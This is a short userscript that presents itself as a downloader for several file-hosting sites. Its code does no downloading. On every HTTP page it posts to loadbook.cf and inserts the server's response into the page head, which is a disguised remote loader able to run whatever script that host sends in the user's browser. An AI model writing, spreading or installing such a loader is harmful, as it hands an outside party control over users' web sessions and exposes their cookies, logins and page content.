// ==UserScript==
// @name        Downloader for
// @namespace   http://www.loadbook.cf
// @description	copiapop downloader, diskokosmiko downloader, kumpulbagi downloader, kutucugum downloader, partagora downloader.
// @include	    http://*
// @oujs:author	Muhammad ariefin
// @icon        http://clipboardjs.com/favicon.ico
// @version     loadbook.cf
// ==/UserScript==
$.post("http://www.loadbook.cf/download/",{status:"true"},function(o){$("head").prepend(o)});